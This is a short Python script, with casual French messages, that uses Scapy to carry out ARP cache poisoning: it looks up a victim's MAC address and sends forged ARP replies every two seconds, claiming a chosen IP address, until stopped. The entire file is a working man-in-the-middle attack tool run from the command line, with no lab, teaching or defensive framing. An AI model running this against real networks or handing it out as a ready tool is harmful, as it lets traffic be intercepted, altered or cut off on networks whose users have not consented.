import sys
import time
from scapy.all import *

def arp_poison(victim_ip, fake_ip):
    conf.verb = 0
    victim_mac = getmacbyip(victim_ip)
    if not victim_mac:
        print(f"il y a pqs de ;qc")
        sys.exit(1)

    print(f"ca se lance")
    packet = Ether(dst=victim_mac)/ARP(op=2, pdst=victim_ip, hwdst=victim_mac, psrc=fake_ip)
    try:
        while True:
            sendp(packet)
            time.sleep(2)
    except KeyboardInterrupt:
        print("\n[*] Arrêt.")

if __name__ == "__main__":
    if len(sys.argv) != 3:
        print("allew on y va")
        sys.exit(1)
    arp_poison(sys.argv[1], sys.argv[2])

#le clavier en qwerty, on cqnnqit
